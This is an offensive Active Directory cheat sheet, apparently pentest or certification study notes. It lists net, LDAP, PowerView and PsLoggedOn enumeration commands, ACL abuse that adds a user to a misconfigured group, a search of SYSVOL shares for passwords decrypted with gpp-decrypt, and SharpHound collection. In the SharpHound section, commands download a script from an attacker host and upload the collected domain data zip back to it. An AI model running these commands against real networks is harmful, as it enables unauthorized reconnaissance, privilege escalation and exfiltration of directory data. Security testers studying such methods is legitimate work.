# Active Directory

Connection: `xfreerdp /u:someuser /p:somepass /d:somedomain.com /v:$TargetIp`

## Native enumeration

```
net user /domain
net user someuser /domain
net group /domain
net group "Some Group With Whitespaces" /domain
```

Local admins (not Active Directory...):
```
net user some_hacked_user /all # for a single user 
net localgroup Administrators # to list local admins on this host
```

## Ldap enumeration

https://learn.microsoft.com/en-us/windows/win32/adschema/a-samaccounttype

```
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```
In a shell:
```
Import-Module .\myscript.ps1
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
LDAPSearch -LDAPQuery "(objectclass=group)"
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.properties | select {$_.cn}, {$_.member} }
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Depart*))"
$group.properties.member
```

## Powerview

Main functions: https://powersploit.readthedocs.io/en/latest/Recon/
- `Get-Domain` - returns the domain object for the current (or specified) domain
- `Get-DomainUser` - return all users or specific user objects in AD
- `Get-DomainGroup` - return all groups or specific group objects in AD
- `Get-DomainComputer` - returns all computers or specific computer objects in AD
- `Get-NetSession` - returns session information for the local (or a remote) machine
- `Find-LocalAdminAccess` - finds machines on the local domain where the current user has local administrator access

### Users and groups

```
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "Some Department" | select member
```

### Operating System

```
Get-NetComputer
Get-NetComputer | select operatingsystem, dnshostname
```

### Permissions and logged users

Tools:
- PowerView
- PsLoggedOn ([Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)): https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon

```
Find-LocalAdminAccess # from PowerView.ps1
Get-NetSession -ComputerName somehostname
Get-NetSession -ComputerName somehostname -Verbose
Get-Acl -Path HKLM:System\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | format-list
C:\PSTools\PsLoggedon.exe \\somehostname
```
Warning: PsLoggedon.exe needs the service `Remote Registry` on the target

### Service accounts

```
cmd > setspn -L some_service
PS > Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### Object permissions

```
Get-ObjectAcl -Identity someuser
Convert-SidToName S-1-5-21-domainidentifiernumber-relativeidentifier
Get-ObjectAcl -Identity "Some Departm*" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"sid1", "sid2", "sid3" | convert-sidtoname
```
Example of misconfiguration:
```
net group "Misconfigured Department" alreadyhackeduser /add /domain
Get-NetGroup "Mis*Dep*" | select member
net group "Misconfigured Department" hackeduser /del /domain # cleanup and check
Get-NetGroup "Mis*Dep*" | select member
```
Known IDs: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers \
Abuse AD ACLs: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse

### Domain shares

Password and hash searches in network shares:
```
> Find-DomainShare
> ls \\pc.domain.com\sysvol\domain.com
> ls \\pc.domain.com\sysvol\domain.com\Policies
> cat \\pc.domain.com\sysvol\domain.com\Policies\suspicious-policy-file.xml
> ls \\otherpc.domain.com\sysvol\domain.com\documentshareoverthenetwork
> ls \\otherpc.domain.com\sysvol\domain.com\documentshareoverthenetwork\directory-with-secret-files
```
Example of password decryption:
```
kali$ gpp-decrypt "string-found-in-some-password-file"
```
Sysvol: https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx

## Automated AD enumeration

### SharpHound

In powershell
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$AttackerIp/SharpHound.ps1', 'SharpHound.ps1')
powershell -ep bypass
Import-Module c:\path\to\Sharphound.ps1
# Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory c:\Users\hackeduser\Desktop -OutputPrefix "some_file_prefix"
ls c:\Users\hackeduser\Desktop
powershell (New-Object System.Net.WebClient).UploadFile('http://$AttackerIp/uploadForWindows.php', 'some_file_prefix_abc123.zip')
```

### BloodHound

```
sudo apt install neo4j
sudo apt install bloodhound
sudo neo4j start
bloodhound > upload data > more info > analysis > find shortest paths to domain admins
```

Custom queries: https://neo4j.com/developer/cypher/
